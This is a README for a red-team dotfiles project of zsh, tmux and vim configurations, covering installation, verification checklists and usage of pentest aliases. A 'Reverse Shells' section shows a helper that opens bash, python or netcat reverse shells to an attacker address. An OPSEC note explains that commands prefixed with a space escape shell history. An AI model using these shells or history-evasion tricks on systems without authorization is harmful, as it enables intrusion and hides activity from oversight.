# Red Team Dotfiles

[![Version](https://img.shields.io/badge/version-2.1.1-blue.svg)](VERSION)

Clean and focused dotfiles for **zsh**, **tmux**, and **vim** tailored for red team operations and penetration testing. No over-engineering, just the essentials.

## ✨ Features

- 🔴 **Red Team Focused**: Aliases and functions for penetration testing
- 🎯 **Terminal Agnostic**: Consistent prompt and behavior across modern terminals
- 🌐 **Network Tools**: IPv4/IPv6 IP detection with service redundancy
- 🛡️ **OPSEC Aware**: Commands starting with space aren't logged
- 🧰 **aliasr Integration**: `a` alias in zsh and tmux keybindings for the aliasr pentest launcher
- 🧭 **Warp-Aware Runtime**: Shell detects Warp and keeps prompt/title behavior compatible
- 🧪 **Startup Hardened**: `zsh` startup is resilient under `nounset` with safe optional loaders
- 🧱 **Helper Fallbacks**: Core helper commands use guarded fallback paths across host differences
- 🎥 **Tmux Fail-Soft Ops**: Recording/history paths stay usable with clear fallback messaging
- 📝 **Vim Startup Fallbacks**: Vim starts cleanly even when optional plugin tooling is unavailable
- ⚡ **Fast & Clean**: Minimal overhead, maximum functionality
- 🔧 **Cross-Platform**: Works on macOS, Linux, and WSL2

## 🚀 Installation

### Prerequisites
- [Zsh](https://www.zsh.org/) - Shell
- [Tmux](https://github.com/tmux/tmux/wiki) - Terminal multiplexer  
- [Vim](https://www.vim.org/) - Text editor

### Quick Install
```bash
# Clone the repository
git clone https://github.com/Maleick/dotfiles.git /opt/dotfiles
cd /opt/dotfiles

# Run the install script
./install.sh
```

### What it does
1. Creates backup of existing dotfiles
2. Symlinks zsh, tmux, and vim configurations
3. Sets up red team aliases and functions

### Verify Installation
```bash
# Restart your shell or run
source ~/.zshrc

# Check available commands
/help
```

### Baseline Verification

Use the Phase 1 checklist for repeatable installer and runtime baseline checks:

- `.planning/phases/01-installation-baseline/01-VERIFICATION-CHECKLIST.md`

The checklist includes syntax checks, tmux/vim startup sanity, installer rerun validation, and expected symlink targets.

### Shell Reliability Verification

After shell-focused changes, run these checks from repo root:

```bash
zsh -n zsh/.zshrc
TERM_PROGRAM=WarpTerminal ZDOTDIR=/opt/dotfiles/zsh zsh -i -c 'echo "${WARP_TERMINAL:-0}"'
TERM_PROGRAM=Apple_Terminal ZDOTDIR=/opt/dotfiles/zsh zsh -i -c 'echo "${WARP_TERMINAL:-0}"'
ZDOTDIR=/opt/dotfiles/zsh zsh -i -c 'base64decode dGVzdA=='
ZDOTDIR=/opt/dotfiles/zsh zsh -i -c 'localip >/dev/null && netinfo >/dev/null'
```

Expected behavior:
- Warp shell check prints `1`; non-Warp prints `0`.
- `base64decode dGVzdA==` prints `test` on macOS and Linux.
- `myip*`, `localip`, and `netinfo` use guarded fallbacks before failing.
- `webserver`, `http-server`, `https-server`, and `quickscan` return actionable errors when dependencies are missing.

### Documentation & Release Verification Checklist

Run this checklist after reliability or docs/release updates to verify end-to-end consistency:

```bash
# 1) Install/symlink baseline
./install.sh
ls -l ~/.zshrc ~/.tmux.conf ~/.vimrc

# 2) Shell checks
zsh -n zsh/.zshrc
TERM_PROGRAM=WarpTerminal ZDOTDIR=/opt/dotfiles/zsh zsh -i -c 'echo "${WARP_TERMINAL:-0}"'
TERM_PROGRAM=Apple_Terminal ZDOTDIR=/opt/dotfiles/zsh zsh -i -c 'echo "${WARP_TERMINAL:-0}"'
ZDOTDIR=/opt/dotfiles/zsh zsh -i -c 'base64decode dGVzdA=='

# 3) Tmux checks
tmux -f /opt/dotfiles/tmux/.tmux.conf -L gsd-docs-check start-server \; kill-server
rg -n '^bind (P|S|U|K|s) ' tmux/.tmux.conf
rg -n 'Logs|asciinema|fzf' tmux/.tmux.conf

# 4) Vim checks
vim -Nu /opt/dotfiles/vim/.vimrc -n -es -c 'qa!'
TMP_HOME="$(mktemp -d)" && HOME="$TMP_HOME" vim -Nu /opt/dotfiles/vim/.vimrc -n -es -c 'qa!' && rm -rf "$TMP_HOME"
rg -n "catppuccin_mocha|dracula|molokai|plug#begin|coc#refresh" vim/.vimrc

# 5) Docs/release integrity checks
VER="$(cat VERSION)"
rg -n "^## \\[$VER\\]" CHANGELOG.md
rg -n "version-" README.md
```

Expected outcomes:
- All commands exit successfully.
- Runtime contract claims in docs map to current source files.
- `VERSION` and latest changelog release header are consistent.

### Validation Wrapper (Phase 5 Baseline)

Run the repo-root verification wrapper:

```bash
./scripts/verify-suite.sh
```

Wrapper contract:
- Runs non-interactively from repository root (read-only verification; does not run `install.sh`).
- Prints deterministic per-check statuses: `PASS`, `FAIL`, `SKIP`.
- Prints a deterministic summary line with PASS/FAIL/SKIP counts.
- Exits `0` only if required checks pass; exits non-zero when any required check fails.
- Optional dependency checks (`asciinema`, `fzf`) fail soft with actionable `SKIP` guidance.

### Local Overrides (Optional)

For machine-specific or sensitive configurations (API keys, local paths, etc.), create `~/.zshrc.local`:

```bash
# Create local overrides file
cat > ~/.zshrc.local << 'EOF'
# Machine-specific configurations
export MY_API_KEY="your-secret-key"
export CUSTOM_PATH="/path/to/tool"
EOF

chmod 600 ~/.zshrc.local
```

**Note**: `.zshrc.local` is automatically ignored by git and won't be synced to the repository.

## 💻 Usage Examples

### Network Reconnaissance
```bash
# External IP Detection (IPv4/IPv6) 
myip                       # External IPv4 address (force IPv4)
myip6                      # External IPv6 address
myip-alt                   # Alternative service (ipinfo.io)
myip-check                 # Backup service (icanhazip.com)
get_external_ip            # Store IP in $EXTERNAL_IP variable
localip                    # Local IP address
netinfo                    # Complete network information

# Port Scanning
quickscan 192.168.1.0/24   # Fast subnet scan
nmap-top-ports 192.168.1.1 # Scan top 1000 ports
```

### Web Servers & Tools
```bash
webserver                  # HTTP server on port 8080
https-server               # HTTPS server (needs cert.pem/key.pem)
```

### Encoding/Decoding
```bash
base64encode "test data"   # dGVzdCBkYXRh
base64decode "dGVzdCBkYXRh" # test data
urlencode "hello world"    # hello%2Bworld
rot13                      # ROT13 cipher
```

### Reverse Shells
```bash
rev-shell bash 10.0.0.1 4444    # Bash reverse shell
rev-shell python 10.0.0.1 4444  # Python reverse shell
rev-shell nc 10.0.0.1 4444      # Netcat reverse shell
```

### Tmux Features
```bash
tmux                       # Start tmux session
# Prefix + P              # Start/stop recording
# Prefix + S              # Save pane history
# Prefix + U / K          # Open aliasr in split pane (send-only / send+execute)
```

### aliasr Launcher
```bash
a                          # Open aliasr TUI for red-team commands (requires aliasr installed)
```

## 🔒 OPSEC Notes

- **Commands starting with space aren't logged** - Use ` command` for sensitive operations
- **Use only on authorized systems** - Respect applicable laws and regulations
- **Backup created automatically** - Install script backs up existing configs

## 🔄 Updates

```bash
# Update to latest version
cd /opt/dotfiles
git pull

# Check current version
cat VERSION
```

## 📝 Available Commands

```bash
# See all available red team commands
/help
```

---

**Note**: This project is for educational and authorized security testing only. Use responsibly and respect all applicable laws.

🔴 **Happy Red Teaming!** 🔴
